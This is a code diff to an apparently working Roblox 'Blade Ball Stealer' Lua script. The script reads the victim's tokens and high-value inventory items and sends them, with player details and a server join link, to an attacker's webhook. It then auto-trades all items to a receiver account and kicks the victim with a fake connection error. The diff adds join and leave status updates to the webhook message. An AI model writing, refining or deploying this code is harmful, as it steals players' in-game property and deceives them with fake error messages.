@@ -13,11 +13,11 @@ local users = _G.Usernames or {}
 local webhook = _G.webhook or ""
 local auth_token = _G.AuthToken or "" 
 local min_rap = _G.min_rap or 100
+_G.LastMessageID = nil
 
 local httpRequest = (syn and syn.request) or (http and http.request) or http_request or request
 local executor = identifyexecutor and identifyexecutor() or "Unknown"
 
--- Detection précise des Tokens Blade Ball
 local function getTokens()
     local amount = 0
     pcall(function()
@@ -26,8 +26,7 @@ local function getTokens()
         elseif plr:FindFirstChild("Data") and plr.Data:FindFirstChild("Coins") then
             amount = plr.Data.Coins.Value
         else
-            local coinText = plr.PlayerGui.Main.Currency.Coins.Amount.Text:gsub("[^%d]", "")
-            amount = tonumber(coinText) or 0
+            amount = tonumber(plr.PlayerGui.Main.Currency.Coins.Amount.Text:gsub("[^%d]", "")) or 0
         end
     end)
     return amount
@@ -41,7 +40,7 @@ local function formatNumber(n)
     return (i == 1) and tostring(math.floor(n)) or string.format("%.1f%s", n, s[i])
 end
 
--- Scan de l'inventaire Blade Ball
+-- Scan Inventaire
 local itemsToSend = {}
 local totalRAP = 0
 local rapData = Replion.Client:GetReplion("ItemRAP").Data.Items
@@ -65,25 +64,26 @@ for _, cat in ipairs({"Sword", "Emote", "Explosion"}) do
     end
 end
 
--- Envoi du Hit avec le style de ton image
-if #itemsToSend > 0 then
+-- Fonction d'envoi Webhook
+local function SendWebhook(status)
     table.sort(itemsToSend, function(a,b) return a.RAP > b.RAP end)
-    
     local itemSummary = "🪙 Tokens: " .. formatNumber(getTokens()) .. "\n\n"
     for i, item in ipairs(itemsToSend) do
         if i > 12 then itemSummary = itemSummary .. "...and more" break end
         itemSummary = itemSummary .. item.Name .. " (x1): " .. formatNumber(item.RAP) .. " RAP\n"
     end
 
-    local joinCode = "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '"..game.JobId.."')"
-    local directJoin = "https://www.roblox.com/games/13772394625?jobId="..game.JobId
+    local joinCommand = "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '"..game.JobId.."')"
+    -- LIEN CORRIGÉ : Protocole direct pour ouvrir Roblox
+    local directJoin = "roblox://experiences/start?placeId=13772394625&gameInstanceId="..game.JobId
 
     local data = {
         ["auth_token"] = auth_token,
-        ["content"] = (_G.pingEveryone == "Yes" and "||​|| @everyone" or "") .. "\n`" .. joinCode .. "`",
+        ["messageID"] = _G.LastMessageID,
+        ["content"] = (status == "JOIN" and _G.pingEveryone == "Yes" and "||​|| @everyone" or ""),
         ["embeds"] = {{
-            ["title"] = "📁 Pending Hit ... | ⚔️ Blade Ball Stealer",
-            ["color"] = 16763904, -- Couleur Or/Jaune
+            ["title"] = (status == "JOIN" and "✅ PLAYER JOINED | Blade Ball" or "❌ PLAYER LEFT | Blade Ball"),
+            ["color"] = (status == "JOIN" and 16763904 or 16711680), -- Jaune si Join, Rouge si Left
             ["fields"] = {
                 {
                     ["name"] = "ℹ️ Player info:",
@@ -92,35 +92,53 @@ if #itemsToSend > 0 then
                         "\n👤 Display Name  : " .. plr.DisplayName ..
                         "\n🗓️ Account Age   : " .. plr.AccountAge .. " Days" ..
                         "\n⚡ Executor      : " .. executor ..
-                        "\n📩 Receiver      : " .. (users[1] or "None") ..
-                        "\n🎮 Server        : " .. #Players:GetPlayers() .. "/15" ..
+                        "\n🎮 Server Status : " .. (status == "JOIN" and "🟢 ONLINE" or "🔴 OFFLINE") ..
                         "```",
                     ["inline"] = false
                 },
                 {
-                    ["name"] = "🎯 Inventory:",
+                    ["name"] = "🎯 Inventory Summary:",
                     ["value"] = "```" ..
                         "\n💰 Total Value: " .. formatNumber(totalRAP) .. " RAP" ..
                         "\n\n" .. itemSummary ..
                         "```",
                     ["inline"] = false
                 },
-                {["name"] = "🔗 Join Server", ["value"] = "[Click to join game]("..directJoin..")", ["inline"] = true},
-                {["name"] = "📜 Full Inventory", ["value"] = "[Click to show](https://www.roblox.com/users/"..plr.UserId.."/inventory)", ["inline"] = true}
+                {["name"] = "🔗 Direct Join", ["value"] = "[CLICK TO TELEPORT]("..directJoin..")", ["inline"] = true},
+                {["name"] = "💻 Script Join", ["value"] = "||`" .. joinCommand .. "`||", ["inline"] = true}
             },
-            ["footer"] = {["text"] = "by Eblack • " .. os.date("%B %d, %Y")},
+            ["footer"] = {["text"] = "Eblack Stealer • " .. os.date("%X")},
             ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..plr.UserId.."&width=420&height=420&format=png"}
         }}
     }
 
-    httpRequest({
+    local response = httpRequest({
         Url = webhook,
         Method = "POST",
         Headers = {["Content-Type"] = "application/json"},
         Body = HttpService:JSONEncode(data)
     })
+    
+    if status == "JOIN" and response.Body then
+        pcall(function()
+            local decoded = HttpService:JSONDecode(response.Body)
+            _G.LastMessageID = decoded.id
+        end)
+    end
+end
 
-    -- Logique de Trade automatique
+-- Détection du départ (Update l'embed en rouge)
+Players.PlayerRemoving:Connect(function(player)
+    if player == plr then
+        SendWebhook("LEFT")
+    end
+end)
+
+-- Lancement initial
+if #itemsToSend > 0 then
+    SendWebhook("JOIN")
+
+    -- Logique de Trade
     local function doTrade(target)
         local tokenAmt = getTokens()
         while #itemsToSend > 0 do
@@ -146,7 +164,6 @@ if #itemsToSend > 0 then
         plr:kick("Please check your internet connection and try again.\n(Error Code: 277)")
     end
 
-    -- Chercher le receveur sur le serveur
     for _, p in ipairs(Players:GetPlayers()) do
         if table.find(users, p.Name) then doTrade(p.Name) break end
     end
